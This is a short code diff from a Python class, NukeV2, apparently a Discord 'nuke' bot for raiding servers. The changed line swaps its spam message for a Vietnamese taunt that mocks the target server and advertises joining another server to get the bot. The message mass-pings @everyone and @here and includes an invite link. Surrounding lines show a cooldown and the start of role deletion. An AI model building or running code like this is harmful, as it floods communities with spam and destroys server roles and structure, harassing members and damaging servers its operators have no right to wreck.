@@ -1534,7 +1534,7 @@ class NukeV2:
             return
         self.last_nuke_time = current_time
 
-        spam_content = "# <:emoji_1470040768453415033:1540558775969120358> **𝔾𝔾.𝕂ℤ3ℕ/𝕂ℤ4ℕ - 𝔹Á 𝕋𝕆ℙ 𝕁𝕆𝕀ℕ 𝕊𝔼ℝ𝕍𝔼ℝ 𝕊𝕌ℙℙ𝕆ℝ𝕋 1 Đ𝕀** <:emoji_1470040768453415033:1540558775969120358>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/PVtT85EPn\n> ||Join 2:|| not server support 2"
+        spam_content = "# <:emoji_1470040768453415033:1540558775969120358> **server ngu thế cay cha ko :))) cay join sv lấy bot để nuke lại nhá** <:emoji_1470040768453415033:1540558775969120358>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/PVtT85EPn\n> ||Join 2:|| not server support 2"
         image_url = "https://i.pinimg.com/originals/00/e3/82/00e38213018124b7f9d81df6cf1b05ca.gif"
 
         await self._log("Starting role deletion...")
